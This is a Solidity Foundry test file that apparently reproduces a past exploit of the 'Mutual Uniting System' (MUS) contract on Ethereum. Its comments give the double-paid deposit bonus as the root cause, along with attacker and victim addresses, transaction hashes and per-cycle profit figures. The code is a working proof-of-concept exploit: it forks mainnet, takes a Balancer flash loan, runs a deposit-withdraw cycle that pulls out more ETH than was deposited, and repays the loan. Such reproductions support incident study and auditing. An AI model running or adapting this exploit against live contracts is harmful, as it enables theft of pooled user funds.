// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// Mutual Uniting System (MUS) - deposit() pays a first-deposit bonus twice: once as an immediate ETH
// refund to the caller, and again as MUS allocation that withdraw() later redeems for ETH, with no cap
// tying total ETH paid out to the ETH actually deposited. A single deposit-then-withdraw from a fresh
// address therefore returns more ETH than was put in. Ethereum.
//
// Sample txs (attacker cycled 16 fresh sub-addresses per tx; all three are in block 26087602):
//   0xfe28118e48c64b275b587c90da472fc13b8c3dbed9d3cded1e18c1e7a7fc0392  (16 cycles)
//   0xaa172fcaa4800b14826daed1a78c9d6dcd8f26ae45ce5f31786d55768b709ec6  (16 cycles)
//   0x905af4e8cdaf32c183605358c97181e9ad57393bd4ed1d945baf6d6eebe983fe
// Attacker EOA    : 0x1a083ADf234a8f67ad65A9B9B616853ACf5998E5
// Attack contract : 0xD1a7A2A3c27962E80E9B6B46D54094F93267e988 (drives the fresh sub-address proxies)
// Victim (MUS)    : 0x9bdf81e6066d32764b7e75a1b5577237e06d9364 (unverified - reversed from bytecode;
//                   symbol "MUS", name "Mutual Uniting System", 14 decimals)
//
// ROOT CAUSE (confirmed against the decompiled bytecode + the real call trace):
//   deposit() and withdraw(uint256,uint256,bool) carry NO owner/admin/caller gate - any address can call
//   them (verified: no `require(caller == ...)` anywhere in either function). For a FRESH depositor,
//   deposit{value: D}() does two things with the same first-deposit bonus:
//     (a) immediately CALLs ETH back to the caller (the bonus refund, R), and
//     (b) credits the caller a MUS allocation that withdraw() can redeem for ETH (W).
//   withdraw() then pays W without ever capping (R + W) at D. Net per fresh cycle: R + W - D > 0, funded
//   out of the pool's standing ETH. The attacker scaled it by repeating from many fresh addresses.
//
// REAL CYCLE 1 (from the trace of the first sample tx, exact wei):
//   deposit value D        = 53.355703172210117028 ETH
//   bonus refund R (in dep)= 32.253522567601017211 ETH   (MUS -> caller, inside deposit())
//   withdraw payout W      = 21.502348378400678141 ETH   (MUS -> caller, inside withdraw())
//   R + W                  = 53.755870946001695352 ETH  >  D
//   net over-extraction    =  0.400167773791578324 ETH   per cycle
//   The first tx ran 16 such cycles from 16 fresh sub-addresses (deposit amounts shrink each cycle), summing
//   to ~5.9476 ETH by the per-cycle R+W-D measure; the MUS pool's own standing ETH (5.335 ETH at 26087601)
//   was fully drained to 0 across the attack block, the rest of each payout coming from same-block legit
//   deposits the pack redistributes. The reported ~$36.9k is the whole campaign across many txs/addresses and
//   is NOT cleanly derivable from these 3 samples; the honest, exactly-reproduced figure is the per-cycle net.
//   Each cycle is self-contained within one call (deposit then withdraw back to back, no multi-tx sequence
//   per address), but the payout side DOES depend on the current pack round being funded: at the plain
//   pre-block state (26087601) a single cycle nets a loss, because the pack that makes withdraw pay out was
//   filled by deposits earlier in the attack block. So this PoC forks at the exact pre-state of the first
//   attack tx (which replays those earlier same-block txs) and replays one cycle from a fresh address there.
//
// The working capital (D) is recyclable: the real attacker sourced it from its own WETH. Here it is taken
// as a Balancer V2 flash loan (0 fee) and repaid in the same tx, so the leftover balance is exactly the
// net over-extraction - the ETH actually drained from the MUS pool.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external; // WETH unwrap
    function deposit() external payable; // WETH wrap
}

interface IMUS {
    function deposit() external payable;
    function withdraw(uint256 pid, uint256 amount, bool withdrawRewards) external;
    function balanceOf(address) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract MUS_exp is BaseTestWithBalanceLog {
    IMUS constant MUS = IMUS(0x9bDF81e6066D32764b7E75a1b5577237e06d9364);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 constant DEPOSIT = 53_355_703_172210117028; // real cycle-1 deposit amount (wei)
    // First sample tx (idx 138 in block 26087602). The exploit's profitability depends on the "pack" round
    // state as it stood right before this tx, which is set up by earlier txs in the same block - a plain
    // block-26087601 fork does NOT reproduce it (a single cycle there nets a loss). Forking AT the tx replays
    // every earlier tx in the block, landing on the exact pre-attack state the attacker actually exploited.
    bytes32 constant FORK_AT_TX = 0xfe28118e48c64b275b587c90da472fc13b8c3dbed9d3cded1e18c1e7a7fc0392;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_AT_TX); // state immediately before the first sample tx
        fundingToken = address(0); // profit realized in native ETH
    }

    function testExploit() public balanceLog {
        // Flash-borrow the working capital (WETH) from Balancer (0 fee); the cycle runs inside the callback.
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = DEPOSIT;
        VAULT.flashLoan(address(this), tokens, amounts, "");

        emit log_named_decimal_uint("net ETH extracted (one cycle)", address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata,
        bytes calldata
    ) external {
        require(msg.sender == address(VAULT), "only vault");
        WETH.withdraw(amounts[0]); // unwrap to ETH

        // --- one exploit cycle from this fresh address ---
        uint256 before = address(this).balance; // == DEPOSIT (borrowed)
        MUS.deposit{value: DEPOSIT}(); // pays the bonus refund R back to us here AND mints a MUS allocation
        uint256 minted = MUS.balanceOf(address(this)); // the double-counted allocation
        MUS.withdraw(0, minted, true); // redeems it for ETH (W), uncapped vs D
        uint256 got = address(this).balance; // == before + R + W - D  (net > before)

        // Over-extraction pulled out of the MUS pool in this single cycle.
        uint256 net = got - before;
        assertApproxEqRel(net, 0.400167773791578324e18, 0.02e18, "per-cycle over-extraction off");
        assertGt(got, before, "cycle did not net a profit");

        // Repay the flash loan (Balancer fee is 0): rewrap DEPOSIT ETH and return it to the Vault.
        WETH.deposit{value: DEPOSIT}();
        WETH.transfer(address(VAULT), amounts[0]);
    }

    receive() external payable {}
}
